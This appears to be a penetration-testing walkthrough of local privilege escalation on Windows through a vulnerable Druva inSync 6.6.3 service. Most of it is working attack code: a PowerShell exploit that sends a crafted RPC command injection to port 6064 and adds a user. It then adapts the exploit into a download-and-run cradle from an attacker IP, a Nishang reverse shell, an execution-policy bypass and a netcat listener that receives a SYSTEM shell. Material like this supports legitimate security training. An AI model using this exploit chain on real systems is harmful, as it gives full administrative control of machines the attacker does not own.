Well-patched systems can still be vulnerable if users can install software or if vulnerable third-party applications are present. Some third-party services run as `NT AUTHORITY\SYSTEM` and expose exploitable interfaces — a goldmine for privilege escalation.

---

## Enumerate Installed Programs First

```cmd
wmic product get name
```
Look for anything non-standard or version-specific. Cross-reference version numbers against known CVEs immediately.

**Example finding:** `Druva inSync 6.6.3` — a quick Google search reveals this version is vulnerable to a command injection attack via an exposed RPC service running locally on port 6064 as `NT AUTHORITY\SYSTEM`.

---

## Full Exploitation Example — Druva inSync 6.6.3

Reference: [Druva inSync Client Local Privilege Escalation](https://www.matteomalvica.com/blog/2020/05/21/druva-insync-windows-lpe/)

### Step 1 — Confirm the service is listening on port 6064
```cmd
netstat -ano | findstr 6064
```
```
TCP    127.0.0.1:6064    0.0.0.0:0    LISTENING    3324
```
Loopback only — not externally accessible, but reachable locally.

### Step 2 — Map PID to process name
```powershell
get-process -Id 3324
# ProcessName: inSyncCPHwnet64
```

### Step 3 — Confirm the service is running
```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
# Status: Running | Name: inSyncCPHService
```

### Step 4 — Run the PoC (base command injection)
The PoC opens a TCP socket to port 6064 and sends a crafted RPC call that forces the SYSTEM-context service to execute an arbitrary command via a path traversal to `cmd.exe`:

```powershell
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### Step 5 — Modify for a reverse shell (preferred over adding a user)
Adding a local user is noisy and modifies the system. Instead, use a PowerShell reverse shell via [Invoke-PowerShellTcp.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1):

Append to the bottom of `shell.ps1`:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

Change `$cmd` in the PoC to:
```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### Step 6 — Host the shell script
```bash
python3 -m http.server 8080
```

### Step 7 — Set execution policy and run the PoC on target
```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

### Step 8 — Catch the SYSTEM shell
```bash
nc -lvnp 9443
```
```
whoami
nt authority\system
```

---

## Key Takeaways
- Always enumerate installed software (`wmic product get name`) — third-party apps running as SYSTEM with locally exposed interfaces are frequent privesc vectors.
- Locally-bound services (loopback only) are still exploitable once you have a shell — always check `netstat -ano` for unusual local ports.
- Prefer reverse shells over adding local admin users — less noisy, less system modification.
- Defensively: restrict local admin rights (principle of least privilege) and use application whitelisting to prevent unapproved software installations.